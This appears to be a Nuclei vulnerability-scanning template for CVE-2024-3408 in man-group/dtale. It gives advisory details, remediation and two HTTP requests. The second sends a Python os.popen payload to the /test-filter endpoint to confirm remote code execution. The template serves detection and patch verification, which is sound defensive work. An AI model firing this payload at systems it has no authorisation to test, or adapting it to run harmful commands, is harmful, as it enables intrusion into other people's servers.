id: CVE-2024-3408

info:
  name: man-group/dtale - Authentication Bypass & Remote Code Execution
  author: relentless-robotics
  severity: critical
  description: |
    man-group/dtale versions up to and including 3.10.0 contain an authentication
    bypass vulnerability combined with arbitrary code execution. The vulnerability
    stems from a hardcoded SECRET_KEY in Flask configuration, allowing attackers to
    forge session cookies and bypass authentication. Additionally, the application
    fails to properly restrict custom filter queries, enabling attackers to execute
    arbitrary code on the server via the /test-filter endpoint, even when
    enable_custom_filters is not enabled.
  impact: |
    Unauthenticated attackers can forge valid session cookies and execute arbitrary
    system commands with the privileges of the dtale application. This leads to
    complete system compromise including data theft, system alteration, and denial
    of service.
  remediation: |
    Upgrade to dtale version 3.15.1 or later, which fixes both the hardcoded
    SECRET_KEY and filter validation issues.
  reference:
    - https://github.com/advisories/GHSA-v9q6-fm48-rx74
    - https://nvd.nist.gov/vuln/detail/CVE-2024-3408
    - https://huntr.com/bounties/dtale
    - https://github.com/man-group/dtale/security/advisories
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-3408
    cwe-id: CWE-94,CWE-798
    epss-score: 0.78745
    epss-percentile: 0.99000
    cpe: cpe:2.3:a:man-group:dtale:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: man-group
    product: dtale
    tags: cve,cve2024,dtale,authentication-bypass,rce,intrusive,python,flask

http:
  - raw:
      # Step 1: Check if dtale is accessible and detect version
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

      # Step 2: Attempt RCE via test-filter endpoint with echo output
      - |
        GET /dtale/test-filter/1?query=__import__('os').popen('echo+{{randstr}}').read() HTTP/1.1
        Host: {{Hostname}}

    req-condition: true
    matchers-condition: and
    matchers:
      - type: word
        part: body_1
        words:
          - "dtale"
          - "D-Tale"
        case-insensitive: true

      - type: word
        part: body_2
        words:
          - "{{randstr}}"

      - type: status
        part: header_2
        status:
          - 200

    extractors:
      - type: regex
        part: body_1
        name: version
        group: 1
        regex:
          - 'version["\s:]+([0-9.]+)'
          - 'dtale[/\\-]v?([0-9.]+)'
